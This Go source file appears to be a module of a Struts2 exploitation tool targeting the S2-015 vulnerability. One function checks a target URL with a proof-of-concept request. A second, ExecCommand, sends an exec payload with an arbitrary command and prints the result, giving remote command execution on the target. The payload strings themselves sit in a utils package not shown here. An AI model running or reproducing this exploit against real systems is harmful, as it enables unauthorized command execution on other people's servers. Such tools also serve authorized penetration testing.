package s015

import (
	"ST2G/cvemod/utils"
	"fmt"
	"github.com/fatih/color"
)

func Check(targetUrl string){
	respString := utils.GetFunc4Struts2(targetUrl,"",utils.POC_s015_check)
	if utils.IfContainsStr(respString,"6308") {
		color.Red("*Found Struts2-015！")
	}else {
		fmt.Println("Struts2-015 Not Vulnerable.")
	}
}
func ExecCommand(targetUrl string,command string) {
	respString := utils.GetFunc4Struts2(targetUrl,"",utils.POC_s015_exec(command))
	execResult := utils.GetBetweenStr(respString,"s015execstart","s015execend")
	fmt.Println(execResult[13:])
}